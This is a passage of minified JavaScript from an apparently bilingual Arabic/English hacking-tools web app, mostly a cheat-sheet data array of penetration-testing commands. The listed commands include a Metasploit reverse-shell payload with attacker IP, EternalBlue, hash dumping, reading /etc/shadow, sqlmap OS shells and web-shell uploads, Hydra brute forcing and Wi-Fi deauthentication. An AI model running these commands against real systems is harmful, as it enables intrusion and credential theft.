                                                        accept: ".txt,.html,.css,.js,.ts,.jsx,.tsx,.json,.xml,.md,.csv,.py,.java,.c,.cpp,.h,.php,.rb,.go,.rs,.swift,.kt,.sh,.bash,.zsh,.yaml,.yml,.toml,.ini,.cfg,.conf,.log,.sql",
                                                        className: "hidden",
                                                    }),
                                                    l.jsx("button", {
                                                        type: "button",
                                                        onClick: () => {
                                                            var I;
                                                            return (I = U.current) == null ? void 0 : I.click();
                                                        },
                                                        disabled: !!b,
                                                        className:
                                                            "px-3 py-3 rounded-xl bg-secondary border border-border/50 text-muted-foreground hover:border-primary/50 hover:text-primary transition-all disabled:opacity-50 disabled:cursor-not-allowed",
                                                        title: re.addFile,
                                                        children: l.jsx(kx, { className: "w-5 h-5" }),
                                                    }),
                                                    l.jsx("input", {
                                                        type: "text",
                                                        value: n,
                                                        onChange: (I) => r(I.target.value),
                                                        placeholder: re.typePlaceholder,
                                                        className:
                                                            "flex-1 px-4 py-3 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all",
                                                        disabled: o,
                                                        dir: w === "ar" ? "rtl" : "ltr",
                                                    }),
                                                    l.jsx("button", {
                                                        type: "submit",
                                                        disabled: o || (!n.trim() && h.length === 0 && !b),
                                                        className:
                                                            "cyber-button-primary px-6 disabled:opacity-50 disabled:cursor-not-allowed",
                                                        children: l.jsx(Ex, { className: "w-5 h-5" }),
                                                    }),
                                                ],
                                            }),
                                        ],
                                    }),
                                ],
                            }),
                        ],
                    }),
                }),
                l.jsx(_r, {}),
                s &&
                    l.jsx("div", {
                        className:
                            "fixed inset-0 z-50 flex items-center justify-center bg-background/80 backdrop-blur-sm",
                        children: l.jsxs("div", {
                            className: "cyber-card p-8 max-w-md w-full mx-4 animate-scale-in",
                            children: [
                                l.jsxs("div", {
                                    className: "text-center mb-6",
                                    children: [
                                        l.jsx("div", {
                                            className:
                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                            children: l.jsx(Rc, { className: "w-8 h-8 text-primary" }),
                                        }),
                                        l.jsx("h2", {
                                            className: "text-2xl font-bold text-primary mb-2",
                                            children: re.advancedRequest,
                                        }),
                                        l.jsx("p", {
                                            className: "text-muted-foreground text-sm",
                                            children: re.advancedDesc,
                                        }),
                                    ],
                                }),
                                l.jsxs("div", {
                                    className:
                                        "flex flex-col items-center gap-4 p-4 rounded-xl bg-gradient-to-r from-purple-500/10 to-pink-500/10 border border-purple-500/30 mb-6",
                                    children: [
                                        l.jsx("p", {
                                            className: "text-sm text-muted-foreground text-center",
                                            children: re.passwordHint,
                                        }),
                                        l.jsxs("a", {
                                            href: "https://www.instagram.com/qusay_kali1/",
                                            target: "_blank",
                                            rel: "noopener noreferrer",
                                            className:
                                                "inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-gradient-to-r from-purple-500 to-pink-500 text-white text-sm font-medium hover:opacity-90 transition-opacity",
                                            children: [l.jsx(Ap, { className: "w-4 h-4" }), "@qusay_kali"],
                                        }),
                                    ],
                                }),
                                l.jsxs("form", {
                                    onSubmit: Ot,
                                    children: [
                                        l.jsx("input", {
                                            type: "password",
                                            value: c,
                                            onChange: (I) => u(I.target.value),
                                            placeholder: re.enterPassword,
                                            className:
                                                "w-full px-4 py-3 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all mb-4",
                                            autoFocus: !0,
                                        }),
                                        S &&
                                            l.jsx("p", {
                                                className: "text-destructive text-sm mb-4 text-center",
                                                children: S,
                                            }),
                                        l.jsxs("div", {
                                            className: "flex gap-3",
                                            children: [
                                                l.jsx("button", {
                                                    type: "button",
                                                    onClick: () => {
                                                        a(!1), f(""), y("");
                                                    },
                                                    className:
                                                        "flex-1 px-6 py-3 rounded-xl border border-border/50 text-muted-foreground hover:bg-secondary transition-colors",
                                                    children: re.cancel,
                                                }),
                                                l.jsx("button", {
                                                    type: "submit",
                                                    className: "flex-1 cyber-button-primary",
                                                    children: re.confirm,
                                                }),
                                            ],
                                        }),
                                    ],
                                }),
                            ],
                        }),
                    }),
            ],
        });
    },
    mk = {
        Nmap: Jr,
        Metasploit: Tr,
        "Burp Suite": dx,
        Wireshark: vg,
        "John the Ripper": jc,
        Hydra: Gu,
        SQLMap: hg,
        "Aircrack-ng": Ix,
        Nikto: fg,
        Hashcat: hx,
        Gobuster: br,
        Netcat: xg,
        Enum4linux: gg,
        Dirb: aa,
        Wfuzz: Vu,
        theHarvester: Px,
        Maltego: fx,
        Responder: Mx,
    },
    Wo = [
        {
            name: "Nmap",
            description: {
                ar: "أداة فحص الشبكات واكتشاف المنافذ المفتوحة",
                en: "Network scanning and port discovery tool",
            },
            commands: [
                {
                    command: "nmap -sP 192.168.1.0/24",
                    description: {
                        ar: "فحص جميع الأجهزة في الشبكة (Ping Scan)",
                        en: "Scan all devices in network (Ping Scan)",
                    },
                },
                {
                    command: "nmap -sS 192.168.1.1",
                    description: { ar: "فحص سريع للمنافذ (SYN Scan)", en: "Fast port scan (SYN Scan)" },
                },
                {
                    command: "nmap -sV 192.168.1.1",
                    description: { ar: "اكتشاف إصدارات الخدمات", en: "Service version detection" },
                },
                { command: "nmap -O 192.168.1.1", description: { ar: "اكتشاف نظام التشغيل", en: "OS detection" } },
                { command: "nmap -A 192.168.1.1", description: { ar: "فحص شامل", en: "Aggressive scan" } },
                {
                    command: "nmap -p 1-65535 192.168.1.1",
                    description: { ar: "فحص جميع المنافذ", en: "Full port scan" },
                },
                { command: "nmap -sU 192.168.1.1", description: { ar: "فحص منافذ UDP", en: "UDP port scan" } },
                {
                    command: "nmap --script vuln 192.168.1.1",
                    description: { ar: "فحص الثغرات", en: "Vulnerability scan" },
                },
                {
                    command: "nmap -sN 192.168.1.1",
                    description: { ar: "فحص خفي (Null Scan)", en: "Stealth scan (Null Scan)" },
                },
                {
                    command: "nmap -oN scan.txt 192.168.1.1",
                    description: { ar: "حفظ النتائج في ملف", en: "Save results to file" },
                },
                {
                    command: "nmap -sC 192.168.1.1",
                    description: { ar: "تشغيل السكربتات الافتراضية", en: "Run default scripts" },
                },
                {
                    command: "nmap -Pn 192.168.1.1",
                    description: { ar: "تخطي Ping واعتبار الهدف متصل", en: "Skip ping, treat host as online" },
                },
                {
                    command: "nmap -T4 192.168.1.1",
                    description: { ar: "فحص سريع (Aggressive Timing)", en: "Fast scan (Aggressive Timing)" },
                },
                {
                    command: "nmap --script http-enum 192.168.1.1",
                    description: { ar: "اكتشاف مجلدات الويب", en: "Web directory enumeration" },
                },
                {
                    command: "nmap -sS -sV -O -A 192.168.1.1",
                    description: { ar: "فحص شامل مع كل الميزات", en: "Full scan with all features" },
                },
                {
                    command: "nmap --script smb-vuln* 192.168.1.1",
                    description: { ar: "فحص ثغرات SMB", en: "SMB vulnerability scan" },
                },
                {
                    command: "nmap -sV --version-intensity 5 192.168.1.1",
                    description: { ar: "فحص عميق للإصدارات", en: "Deep version scan" },
                },
                {
                    command: "nmap --top-ports 1000 192.168.1.1",
                    description: { ar: "فحص أشهر 1000 منفذ", en: "Scan top 1000 ports" },
                },
                {
                    command: "nmap -f 192.168.1.1",
                    description: {
                        ar: "تقسيم الحزم لتجاوز الجدار الناري",
                        en: "Fragment packets for firewall evasion",
                    },
                },
                {
                    command: "nmap --spoof-mac 0 192.168.1.1",
                    description: { ar: "استخدام MAC عشوائي", en: "Use random MAC address" },
                },
            ],
        },
        {
            name: "Metasploit",
            description: { ar: "إطار عمل لاختبار الاختراق وتنفيذ الثغرات", en: "Penetration testing framework" },
            commands: [
                {
                    command: "msfconsole",
                    description: { ar: "تشغيل واجهة Metasploit", en: "Start Metasploit console" },
                },
                {
                    command: "search exploit/windows",
                    description: { ar: "البحث عن ثغرات ويندوز", en: "Search Windows exploits" },
                },
                {
                    command: "use exploit/multi/handler",
                    description: { ar: "استخدام مستقبل الاتصالات", en: "Use connection handler" },
                },
                {
                    command: "set PAYLOAD windows/meterpreter/reverse_tcp",
                    description: { ar: "تعيين Payload", en: "Set payload" },
                },
                { command: "set LHOST 192.168.1.100", description: { ar: "تعيين IP المهاجم", en: "Set attacker IP" } },
                { command: "set LPORT 4444", description: { ar: "تعيين المنفذ", en: "Set port" } },
                { command: "exploit", description: { ar: "تنفيذ الاستغلال", en: "Execute exploit" } },
                { command: "sessions -l", description: { ar: "عرض الجلسات النشطة", en: "List active sessions" } },
                { command: "sessions -i 1", description: { ar: "الدخول للجلسة", en: "Interact with session" } },
                {
                    command: "db_nmap -sV 192.168.1.1",
                    description: { ar: "فحص Nmap وحفظ في قاعدة البيانات", en: "Nmap scan and save to DB" },
                },
                {
                    command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe",
                    description: { ar: "إنشاء Payload", en: "Generate payload" },
                },
                {
                    command: "use auxiliary/scanner/portscan/tcp",
                    description: { ar: "فحص المنافذ", en: "Port scanner" },
                },
                {
                    command: "use post/windows/gather/hashdump",
                    description: { ar: "استخراج الهاشات", en: "Dump hashes" },
                },
                { command: "background", description: { ar: "إرسال الجلسة للخلفية", en: "Background session" } },
                {
                    command: "use exploit/windows/smb/ms17_010_eternalblue",
                    description: { ar: "ثغرة EternalBlue", en: "EternalBlue exploit" },
                },
                {
                    command: "search type:exploit platform:linux",
                    description: { ar: "البحث عن ثغرات لينكس", en: "Search Linux exploits" },
                },
                { command: "show options", description: { ar: "عرض الخيارات المتاحة", en: "Show options" } },
                {
                    command: "info exploit/windows/smb/ms08_067",
                    description: { ar: "معلومات عن ثغرة", en: "Exploit info" },
                },
                {
                    command: "vulns",
                    description: { ar: "عرض الثغرات المكتشفة", en: "Show discovered vulnerabilities" },
                },
                {
                    command: "workspace -a pentest",
                    description: { ar: "إنشاء مساحة عمل جديدة", en: "Create new workspace" },
                },
            ],
        },
        {
            name: "Burp Suite",
            description: { ar: "أداة لفحص تطبيقات الويب واكتشاف الثغرات", en: "Web application security testing tool" },
            commands: [
                {
                    command: "Proxy → Intercept → On",
                    description: { ar: "تفعيل اعتراض الطلبات", en: "Enable request interception" },
                },
                { command: "Target → Site map", description: { ar: "عرض خريطة الموقع", en: "View site map" } },
                {
                    command: "Intruder → Positions",
                    description: { ar: "تحديد نقاط الحقن", en: "Set injection points" },
                },
                { command: "Repeater → Send", description: { ar: "إعادة إرسال الطلبات", en: "Resend requests" } },
                {
                    command: "Scanner → Active scan",
                    description: { ar: "فحص تلقائي للثغرات", en: "Active vulnerability scan" },
                },
                { command: "Decoder → Encode/Decode", description: { ar: "تشفير وفك تشفير", en: "Encode/Decode" } },
                { command: "Comparer → Compare", description: { ar: "مقارنة استجابتين", en: "Compare responses" } },
                { command: "Extender → BApp Store", description: { ar: "تثبيت إضافات", en: "Install extensions" } },
                { command: "Options → Upstream Proxy", description: { ar: "إعداد بروكسي", en: "Configure proxy" } },
                { command: "Logger → View logs", description: { ar: "عرض السجلات", en: "View logs" } },
                { command: "Intruder → Sniper Attack", description: { ar: "هجوم Sniper", en: "Sniper attack" } },
                {
                    command: "Intruder → Cluster Bomb",
                    description: { ar: "هجوم Cluster Bomb", en: "Cluster Bomb attack" },
                },
                {
                    command: "Collaborator → Poll now",
                    description: { ar: "فحص Collaborator", en: "Poll Collaborator" },
                },
                { command: "Target → Scope → Add", description: { ar: "إضافة للنطاق", en: "Add to scope" } },
                {
                    command: "Proxy → Options → Match and Replace",
                    description: { ar: "تعديل الطلبات تلقائياً", en: "Auto-modify requests" },
                },
                { command: "Sequencer → Live capture", description: { ar: "تحليل التوكنات", en: "Token analysis" } },
                { command: "Scanner → Crawl", description: { ar: "زحف الموقع", en: "Crawl site" } },
                { command: "Proxy → HTTP history", description: { ar: "سجل الطلبات", en: "Request history" } },
                { command: "Target → Issues", description: { ar: "عرض المشاكل المكتشفة", en: "View issues" } },
                { command: "Dashboard → Event log", description: { ar: "سجل الأحداث", en: "Event log" } },
            ],
        },
        {
            name: "Wireshark",
            description: { ar: "أداة تحليل حزم الشبكة", en: "Network packet analyzer" },
            commands: [
                { command: "ip.addr == 192.168.1.1", description: { ar: "فلترة حسب IP", en: "Filter by IP" } },
                { command: "tcp.port == 80", description: { ar: "فلترة حسب منفذ TCP", en: "Filter by TCP port" } },
                { command: "http", description: { ar: "عرض HTTP فقط", en: "Show HTTP only" } },
                { command: "dns", description: { ar: "عرض DNS فقط", en: "Show DNS only" } },
                { command: "tcp.flags.syn == 1", description: { ar: "عرض حزم SYN", en: "Show SYN packets" } },
                { command: 'frame contains "password"', description: { ar: "البحث عن كلمة", en: "Search for word" } },
                { command: "ip.src == 192.168.1.1", description: { ar: "فلترة حسب المصدر", en: "Filter by source" } },
                {
                    command: "ip.dst == 192.168.1.1",
                    description: { ar: "فلترة حسب الوجهة", en: "Filter by destination" },
                },
                { command: "Follow TCP Stream", description: { ar: "تتبع محادثة TCP", en: "Follow TCP stream" } },
                {
                    command: "Statistics → Protocol Hierarchy",
                    description: { ar: "إحصائيات البروتوكولات", en: "Protocol statistics" },
                },
                {
                    command: 'http.request.method == "POST"',
                    description: { ar: "طلبات POST فقط", en: "POST requests only" },
                },
                {
                    command: "tcp.analysis.retransmission",
                    description: { ar: "الحزم المعاد إرسالها", en: "Retransmitted packets" },
                },
                { command: "!arp", description: { ar: "استبعاد ARP", en: "Exclude ARP" } },
                { command: "ssl.handshake", description: { ar: "عرض SSL Handshake", en: "Show SSL Handshake" } },
                { command: "ftp", description: { ar: "عرض FTP فقط", en: "Show FTP only" } },
                { command: "icmp", description: { ar: "عرض ICMP فقط", en: "Show ICMP only" } },
                { command: "tcp.stream eq 0", description: { ar: "عرض Stream محدد", en: "Show specific stream" } },
                { command: "http.response.code == 404", description: { ar: "أخطاء 404", en: "404 errors" } },
                { command: "eth.addr == aa:bb:cc:dd:ee:ff", description: { ar: "فلترة حسب MAC", en: "Filter by MAC" } },
                {
                    command: "Statistics → Conversations",
                    description: { ar: "المحادثات الشبكية", en: "Network conversations" },
                },
            ],
        },
        {
            name: "John the Ripper",
            description: { ar: "أداة لكسر كلمات المرور", en: "Password cracking tool" },
            commands: [
                {
                    command: "john --wordlist=rockyou.txt hash.txt",
                    description: { ar: "كسر باستخدام قائمة", en: "Crack with wordlist" },
                },
                { command: "john --format=raw-md5 hash.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
                { command: "john --show hash.txt", description: { ar: "عرض المكسورة", en: "Show cracked" } },
                {
                    command: "john --incremental hash.txt",
                    description: { ar: "هجوم تزايدي", en: "Incremental attack" },
                },
                { command: "john --rules hash.txt", description: { ar: "استخدام قواعد", en: "Use rules" } },
                {
                    command: "unshadow /etc/passwd /etc/shadow > hash.txt",
                    description: { ar: "دمج ملفات لينكس", en: "Merge Linux files" },
                },
                { command: "john --format=NT hash.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
                { command: "john --fork=4 hash.txt", description: { ar: "استخدام 4 أنوية", en: "Use 4 cores" } },
                { command: "john --restore", description: { ar: "استكمال جلسة", en: "Resume session" } },
                {
                    command: "john --list=formats",
                    description: { ar: "عرض الصيغ المدعومة", en: "List supported formats" },
                },
                {
                    command: "john --pot=cracked.pot hash.txt",
                    description: { ar: "حفظ في ملف مخصص", en: "Save to custom file" },
                },
                { command: "john --mask=?a?a?a?a hash.txt", description: { ar: "هجوم Mask", en: "Mask attack" } },
                { command: "john --single hash.txt", description: { ar: "وضع Single Crack", en: "Single crack mode" } },
                {
                    command: "john --loopback hash.txt",
                    description: { ar: "إعادة استخدام المكسورة", en: "Reuse cracked passwords" },
                },
                {
                    command: "john --format=sha512crypt hash.txt",
                    description: { ar: "كسر SHA512", en: "Crack SHA512" },
                },
                {
                    command: "zip2john file.zip > hash.txt",
                    description: { ar: "استخراج هاش ZIP", en: "Extract ZIP hash" },
                },
                {
                    command: "pdf2john file.pdf > hash.txt",
                    description: { ar: "استخراج هاش PDF", en: "Extract PDF hash" },
                },
                {
                    command: "john --session=crack1 hash.txt",
                    description: { ar: "حفظ الجلسة باسم", en: "Save session with name" },
                },
                { command: "john --status", description: { ar: "حالة الكسر", en: "Crack status" } },
                {
                    command: "john --wordlist=wordlist.txt --rules=best64 hash.txt",
                    description: { ar: "قائمة مع قواعد", en: "Wordlist with rules" },
                },
            ],
        },
        {
            name: "Hydra",
            description: { ar: "أداة لهجمات القوة الغاشمة", en: "Brute force attack tool" },
            commands: [
                {
                    command: "hydra -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "هجوم SSH", en: "SSH attack" },
                },
                {
                    command: "hydra -L users.txt -P pass.txt 192.168.1.1 ftp",
                    description: { ar: "هجوم FTP", en: "FTP attack" },
                },
                {
                    command:
                        'hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"',
                    description: { ar: "هجوم نموذج ويب", en: "Web form attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt rdp://192.168.1.1",
                    description: { ar: "هجوم RDP", en: "RDP attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt mysql://192.168.1.1",
                    description: { ar: "هجوم MySQL", en: "MySQL attack" },
                },
                {
                    command: "hydra -t 4 -l admin -P pass.txt ssh://192.168.1.1",
                    description: { ar: "4 محاولات متزامنة", en: "4 concurrent attempts" },
                },
                {
                    command: "hydra -V -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "وضع مفصل", en: "Verbose mode" },
                },
                {
                    command: "hydra -e nsr -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "تجربة كلمات مرور فارغة", en: "Try empty passwords" },
                },
                {
                    command: "hydra -o results.txt -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "حفظ النتائج", en: "Save results" },
                },
                {
                    command: "hydra -x 6:8:aA1 192.168.1.1 ssh -l admin",
                    description: { ar: "توليد كلمات مرور", en: "Generate passwords" },
                },
                {
                    command: "hydra -l admin -P pass.txt smb://192.168.1.1",
                    description: { ar: "هجوم SMB", en: "SMB attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt telnet://192.168.1.1",
                    description: { ar: "هجوم Telnet", en: "Telnet attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt vnc://192.168.1.1",
                    description: { ar: "هجوم VNC", en: "VNC attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt pop3://192.168.1.1",
                    description: { ar: "هجوم POP3", en: "POP3 attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt imap://192.168.1.1",
                    description: { ar: "هجوم IMAP", en: "IMAP attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt smtp://192.168.1.1",
                    description: { ar: "هجوم SMTP", en: "SMTP attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt ldap://192.168.1.1",
                    description: { ar: "هجوم LDAP", en: "LDAP attack" },
                },
                {
                    command: "hydra -s 8080 -l admin -P pass.txt 192.168.1.1 http-get",
                    description: { ar: "منفذ مخصص", en: "Custom port" },
                },
                {
                    command: "hydra -w 10 -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "وقت انتظار 10 ثواني", en: "10 second wait" },
                },
                { command: "hydra -R", description: { ar: "استكمال جلسة سابقة", en: "Resume previous session" } },
            ],
        },
        {
            name: "SQLMap",
            description: { ar: "أداة آلية لاكتشاف واستغلال ثغرات SQL", en: "Automatic SQL injection tool" },
            commands: [
                { command: 'sqlmap -u "http://site.com/page?id=1"', description: { ar: "فحص رابط", en: "Scan URL" } },
                {
                    command: 'sqlmap -u "URL" --dbs',
                    description: { ar: "استخراج قواعد البيانات", en: "Extract databases" },
                },
                {
                    command: 'sqlmap -u "URL" -D dbname --tables',
                    description: { ar: "استخراج الجداول", en: "Extract tables" },
                },
                {
                    command: 'sqlmap -u "URL" -D dbname -T users --dump',
                    description: { ar: "تفريغ البيانات", en: "Dump data" },
                },
                {
                    command: 'sqlmap -u "URL" --current-user',
                    description: { ar: "المستخدم الحالي", en: "Current user" },
                },
                { command: 'sqlmap -u "URL" --is-dba', description: { ar: "صلاحيات المدير", en: "DBA check" } },
                { command: 'sqlmap -u "URL" --os-shell', description: { ar: "الحصول على Shell", en: "Get shell" } },
                { command: "sqlmap -r request.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
                { command: 'sqlmap -u "URL" --level=5 --risk=3', description: { ar: "فحص عميق", en: "Deep scan" } },
                {
                    command: 'sqlmap -u "URL" --tamper=space2comment',
                    description: { ar: "تجاوز الحماية", en: "Bypass filters" },
                },
                { command: 'sqlmap -u "URL" --batch', description: { ar: "وضع تلقائي", en: "Batch mode" } },
                {
                    command: 'sqlmap -u "URL" --passwords',
                    description: { ar: "استخراج كلمات المرور", en: "Extract passwords" },
                },
                {
                    command: 'sqlmap -u "URL" --file-read=/etc/passwd',
                    description: { ar: "قراءة ملف", en: "Read file" },
                },
                {
                    command: 'sqlmap -u "URL" --file-write=shell.php --file-dest=/var/www/html/',
                    description: { ar: "رفع ملف", en: "Upload file" },
                },
                {
                    command: 'sqlmap -u "URL" --sql-shell',
                    description: { ar: "SQL Shell تفاعلي", en: "Interactive SQL shell" },
                },
                {
                    command: 'sqlmap -u "URL" --dbms=mysql',
                    description: { ar: "تحديد نوع قاعدة البيانات", en: "Specify DBMS" },
                },
                {
                    command: 'sqlmap -u "URL" --technique=BEUST',
                    description: { ar: "تحديد التقنيات", en: "Specify techniques" },
                },
                {
                    command: 'sqlmap -u "URL" --threads=10',
                    description: { ar: "10 خيوط متوازية", en: "10 parallel threads" },
                },
                {
                    command: 'sqlmap -u "URL" --random-agent',
                    description: { ar: "User-Agent عشوائي", en: "Random User-Agent" },
                },
                { command: 'sqlmap -u "URL" --tor', description: { ar: "استخدام Tor", en: "Use Tor" } },
            ],
        },
        {
            name: "Aircrack-ng",
            description: { ar: "مجموعة أدوات لاختبار أمان شبكات Wi-Fi", en: "Wi-Fi security testing suite" },
            commands: [
                {
                    command: "airmon-ng start wlan0",
                    description: { ar: "تفعيل وضع المراقبة", en: "Enable monitor mode" },
                },
                { command: "airodump-ng wlan0mon", description: { ar: "مسح الشبكات", en: "Scan networks" } },
                {
                    command: "airodump-ng -c 6 --bssid XX:XX:XX -w capture wlan0mon",
                    description: { ar: "التقاط حزم شبكة محددة", en: "Capture specific network" },
                },
                {
                    command: "aireplay-ng -0 10 -a XX:XX:XX wlan0mon",
                    description: { ar: "هجوم Deauth", en: "Deauth attack" },
                },
                {
                    command: "aircrack-ng -w wordlist.txt capture.cap",
                    description: { ar: "كسر WPA/WPA2", en: "Crack WPA/WPA2" },
                },
                {
                    command: "aireplay-ng -1 0 -a XX:XX:XX wlan0mon",
                    description: { ar: "مصادقة مزيفة", en: "Fake auth" },
                },
                {
                    command: "aireplay-ng -3 -b XX:XX:XX wlan0mon",
                    description: { ar: "إعادة حقن ARP", en: "ARP replay" },
                },
                {
                    command: "airmon-ng check kill",
                    description: { ar: "إيقاف العمليات المتعارضة", en: "Kill conflicting processes" },
                },
                {
                    command: "airmon-ng stop wlan0mon",
                    description: { ar: "إيقاف وضع المراقبة", en: "Stop monitor mode" },
                },
                {
                    command: "aircrack-ng -J hashcat capture.cap",
                    description: { ar: "تصدير لـ Hashcat", en: "Export for Hashcat" },
                },
                {
                    command: "airodump-ng --encrypt wpa wlan0mon",
                    description: { ar: "عرض WPA فقط", en: "Show WPA only" },
                },
                { command: "aireplay-ng -9 wlan0mon", description: { ar: "اختبار الحقن", en: "Injection test" } },
                {
                    command: "airbase-ng -a XX:XX:XX -e FakeAP wlan0mon",
                    description: { ar: "إنشاء نقطة وصول مزيفة", en: "Create fake AP" },
                },
                {
                    command: "airdecap-ng -w passphrase capture.cap",
                    description: { ar: "فك تشفير الحزم", en: "Decrypt packets" },
                },
                { command: "besside-ng wlan0mon", description: { ar: "كسر تلقائي", en: "Auto crack" } },
                {
                    command: "airodump-ng --wps wlan0mon",
                    description: { ar: "عرض شبكات WPS", en: "Show WPS networks" },
                },
                {
                    command:
                        "packetforge-ng -0 -a XX:XX:XX -h YY:YY:YY -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w arp.cap",
                    description: { ar: "إنشاء حزمة ARP", en: "Forge ARP packet" },
                },
                {
                    command: "airolib-ng mydb --import passwd rockyou.txt",
                    description: { ar: "إنشاء قاعدة بيانات PMK", en: "Create PMK database" },
                },
                {
                    command: "airodump-ng -c 1,6,11 wlan0mon",
                    description: { ar: "مسح قنوات محددة", en: "Scan specific channels" },
                },
                {
                    command: "aircrack-ng -b XX:XX:XX capture.cap",
                    description: { ar: "كسر BSSID محدد", en: "Crack specific BSSID" },
                },
            ],
        },
        {
            name: "Nikto",
            description: { ar: "أداة فحص الثغرات في خوادم الويب", en: "Web server vulnerability scanner" },
            commands: [
                { command: "nikto -h http://192.168.1.1", description: { ar: "فحص أساسي", en: "Basic scan" } },
                {
                    command: "nikto -h http://192.168.1.1 -p 8080",
                    description: { ar: "فحص منفذ محدد", en: "Scan specific port" },
                },
                { command: "nikto -h http://192.168.1.1 -ssl", description: { ar: "فحص HTTPS", en: "Scan HTTPS" } },
                {
                    command: "nikto -h http://192.168.1.1 -o report.html -Format htm",
                    description: { ar: "تقرير HTML", en: "HTML report" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 9",
                    description: { ar: "فحص SQL Injection", en: "SQL Injection scan" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -evasion 1",
                    description: { ar: "تجاوز IDS", en: "IDS evasion" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -maxtime 60s",
                    description: { ar: "تحديد الوقت", en: "Set time limit" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -C all",
                    description: { ar: "فحص جميع CGI", en: "Scan all CGI" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Display V",
                    description: { ar: "عرض تفاصيل", en: "Show details" },
                },
                { command: "nikto -update", description: { ar: "تحديث قاعدة البيانات", en: "Update database" } },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 1",
                    description: { ar: "اختبار الملفات المثيرة", en: "Interesting files" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 2",
                    description: { ar: "إعدادات خاطئة", en: "Misconfigurations" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 3",
                    description: { ar: "الإفصاح عن المعلومات", en: "Info disclosure" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 4",
                    description: { ar: "حقن XSS", en: "XSS injection" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -id admin:password",
                    description: { ar: "مصادقة HTTP", en: "HTTP auth" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -useproxy http://127.0.0.1:8080",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                { command: "nikto -h targets.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
                { command: "nikto -h http://192.168.1.1 -no404", description: { ar: "تجاهل 404", en: "Ignore 404" } },
                {
                    command: "nikto -h http://192.168.1.1 -root /admin",
                    description: { ar: "تحديد المسار الجذري", en: "Set root path" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Pause 5",
                    description: { ar: "إيقاف مؤقت 5 ثواني", en: "5 second pause" },
                },
            ],
        },
        {
            name: "Hashcat",
            description: { ar: "أداة كسر الهاش باستخدام GPU", en: "GPU hash cracking tool" },
            commands: [
                { command: "hashcat -m 0 hash.txt wordlist.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
                { command: "hashcat -m 1000 hash.txt wordlist.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
                {
                    command: "hashcat -m 1800 hash.txt wordlist.txt",
                    description: { ar: "كسر SHA512", en: "Crack SHA512" },
                },
                {
                    command: "hashcat -m 22000 hash.hc22000 wordlist.txt",
                    description: { ar: "كسر WPA2", en: "Crack WPA2" },
                },
                {
                    command: "hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a",
                    description: { ar: "هجوم Mask", en: "Mask attack" },
                },
                {
                    command: "hashcat -a 0 -m 0 hash.txt wordlist.txt -r rules.rule",
                    description: { ar: "هجوم مع قواعد", en: "Attack with rules" },
                },
                {
                    command: "hashcat -a 6 -m 0 hash.txt wordlist.txt ?d?d",
                    description: { ar: "هجوم مختلط", en: "Hybrid attack" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --show",
                    description: { ar: "عرض المكسورة", en: "Show cracked" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt -O",
                    description: { ar: "تحسين الأداء", en: "Optimize performance" },
                },
                { command: "hashcat -I", description: { ar: "معلومات الأجهزة", en: "Device info" } },
                { command: "hashcat --benchmark", description: { ar: "اختبار الأداء", en: "Benchmark" } },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --increment",
                    description: { ar: "وضع تزايدي", en: "Increment mode" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt -w 3",
                    description: { ar: "وضع أداء عالي", en: "High performance" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --session=crack1",
                    description: { ar: "حفظ الجلسة", en: "Save session" },
                },
                { command: "hashcat --restore", description: { ar: "استكمال الجلسة", en: "Restore session" } },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --potfile-disable",
                    description: { ar: "تعطيل Potfile", en: "Disable potfile" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --force",
                    description: { ar: "تجاوز التحذيرات", en: "Force run" },
                },
                {
                    command: "hashcat -m 0 hash.txt -a 1 dict1.txt dict2.txt",
                    description: { ar: "هجوم Combinator", en: "Combinator attack" },
                },
                {
                    command: "hashcat -m 400 hash.txt wordlist.txt",
